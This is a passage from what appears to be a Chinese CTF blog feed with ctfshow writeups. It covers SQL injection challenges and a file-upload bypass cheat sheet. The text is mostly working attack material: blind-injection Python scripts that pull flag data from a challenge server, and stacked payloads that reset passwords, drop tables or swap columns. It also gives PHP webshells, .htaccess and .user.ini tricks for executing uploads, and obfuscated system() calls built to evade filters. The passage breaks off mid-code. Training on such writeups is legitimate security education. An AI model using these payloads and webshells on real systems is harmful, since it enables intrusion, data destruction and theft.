string\">\"select group_concat(table_name) from information_schema.tables where table_schema=database()\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(f1ag) from ctfshow_fl0g\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token string\">\"username\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"admin' and if(ascii(substr((</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>payload<span class=\"token punctuation\">}</span></span><span class=\"token string\">),</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1)) &gt; </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>mid<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1,2) ='1\"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token string\">\"password\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\"># print(data)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span>  <span class=\"token operator\">==</span> res<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            left <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            right <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"result:\"</span><span class=\"token punctuation\">,</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><h1 id=\"web-191\"><a class=\"anchor\" href=\"#web-191\">#</a> web 191</h1>\n<p>过滤了 <code>ascii</code> ，使用 <code>ord</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Github       : https://github.com/dpm12345</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Date         : 2023-07-15 17:17:55</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>LastEditors  : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>LastEditTime : 2023-07-15 18:05:57</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Description  : </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pwd <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>str_set <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>punctuation </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d6c927bd-730c-4a1c-a8d0-de2deaca515b.challenge.ctf.show/api/\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    left <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    right <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">while</span> left <span class=\"token operator\">&lt;</span> right<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">+</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token comment\"># payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\"># payload = \"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(f1ag) from ctfshow_fl0g\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token string\">\"username\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"admin' and if(ord(substr((</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>payload<span class=\"token punctuation\">}</span></span><span class=\"token string\">),</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1)) &gt; </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>mid<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1,2) ='1\"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token string\">\"password\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\"># print(data)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span>  <span class=\"token operator\">==</span> res<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            left <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            right <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"result:\"</span><span class=\"token punctuation\">,</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><h1 id=\"web-195\"><a class=\"anchor\" href=\"#web-195\">#</a> web 195</h1>\n<p>查询语句</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select pass from ctfshow_user where username = <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">}</span></span>;\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>返回逻辑</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 密码检测</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'密码只能为数字'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 密码判断</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'登陆成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\'|\\\"|select|union|or|and|\\x26|\\x7c|file|into/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"登陆成功 flag is <span class=\"token interpolation\"><span class=\"token variable\">$flag</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>可以使用修改表的方法</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">update</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>ctfshow_user<span class=\"token punctuation\">`</span></span><span class=\"token keyword\">set</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><p>将密码重置为 1</p>\n<h1 id=\"web-197\"><a class=\"anchor\" href=\"#web-197\">#</a> web 197</h1>\n<p>查询语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"select pass from ctfshow_user where username = {$username};\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>返回逻辑</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/\\*|\\#\\-|\\x23|\\'|\\\"|union|or|and|\\x26|\\x7c|file|into|select|update|set//i'</span><span class=\"token punctuation\">,</span>$username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>{</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    die<span class=\"token punctuation\">(</span>json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>}</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token keyword\">row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">=</span> $password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>{</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"登陆成功 flag is $flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>}</pre></td></tr></tbody></table></figure><p>在这一题中，与前面相比过滤了 update，不能更新，分号还是可以用，即堆叠注入还是可以用，所以不妨直接删除表，然后创建相同名字、字段的表，而数据自己设置</p>\n<p>因此 payload 为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">drop</span> <span class=\"token keyword\">table</span> ctfshow_user<span class=\"token punctuation\">;</span><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> ctfshow_user<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">insert</span> ctfshow_user<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">value</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-198\"><a class=\"anchor\" href=\"#web-198\">#</a> web 198</h1>\n<p>相比于 197 而言，将 <code>drop</code>  和 <code>create</code>  过滤了</p>\n<p>这里可以使用交换列的方法 (前提是知道用户名是什么), 因为在交换了两列之后，查询语句就变为查询原来的 <code>pass</code>  列，而匹配的密码为原来的 <code>username</code>  列，而 <code>username</code>  是知道的，那么即可拿到 flag</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass2<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass2<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/592e5fba/",
            "url": "http://dpm12345.cn/posts/592e5fba/",
            "title": "文件上传",
            "date_published": "2022-10-04T14:14:40.000Z",
            "content_html": "<h1 id=\"情况\"><a class=\"anchor\" href=\"#情况\">#</a> 情况</h1>\n<ul>\n<li>\n<p>仅仅有前端验证，将前端代码删去一些</p>\n</li>\n<li>\n<p>后端仅验证后缀，改后缀</p>\n</li>\n<li>\n<p>后端仅验证 <code>content-type</code> ，改为可以上传的内容类型</p>\n</li>\n<li>\n<p>后端验证内容头，输入一个要求上传格式的内容头</p>\n</li>\n<li>\n<p>后端验证文件内容，如 <code>php</code>  过滤，可以使用短标签</p>\n</li>\n<li>\n<p>用户配置文件可以上传，采用 <code>auto_append_file=1.txt</code> ，(前提是有默认 <code>index.php</code>  可以打开) 然后在 <code>1.txt</code>  内容进行控制</p>\n</li>\n<li>\n<p>内容不允许有方括号，即普通的一句话木马不能上传，可以将方括号改为大括号</p>\n</li>\n<li>\n<p>一句话木马也可写成 <code>&lt;?php eval (array_pop ($_POST));?&gt;</code> , 同样也可</p>\n</li>\n<li>\n<p>过滤括号可以使用文件包含的，因为文件包含可以不写括号</p>\n</li>\n<li>\n<p>如果对某一字符串进行过滤，可以采用分开写的方式绕过，如日志包含过滤了 log，那么可以写成 <code>&lt;?=include '/var/l'.'og/nginx/access.l'.'og?&gt;</code></p>\n</li>\n<li>\n<p>空格过滤，可以使用换行代替（十六进制下用 <code>0d</code> ）</p>\n</li>\n<li>\n<p>过滤点号后，由于此时不能包含任何一个带点的文件 (如 log), 那么此时也可以使用远程 url 包含，先上传一个 <code>.user.ini</code>  自动加载没有点作为名字的文件，然后在该文件上传一个远程包含 url (其中 url 有一句话木马，该 url 为常地址不带点)，那么就可以 rce 了；另外也可以使用 session 包含竞争</p>\n</li>\n<li>\n<p>若无法上传出配置文件以外的文件 (即删除)，可以在配置文件中直接远程包含文件 (url)</p>\n</li>\n<li>\n<p>PNG 二次渲染</p>\n</li>\n<li>\n<p>jpg 二次渲染</p>\n</li>\n<li>\n<p>上传 <code>.htaccess</code>  文件，将某类型文件作为 php 文件读取</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>AddType application/x-httpd-php .png</pre></td></tr></tbody></table></figure><p>或者</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;FilesMatch \"png\"&gt; </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>SetHandler application/x-httpd-php </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;/FilesMatch&gt;</pre></td></tr></tbody></table></figure><figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;script language='php'&gt;eval($_POST[cmd]);&lt;/script&gt;</pre></td></tr></tbody></table></figure></li>\n<li>\n<p>xxxxxxxxxx1&nbsp;1?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<p><strong>web 167-170</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"s#y#s#t#e#m\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"#\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1s'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ystem'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'metsys'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter 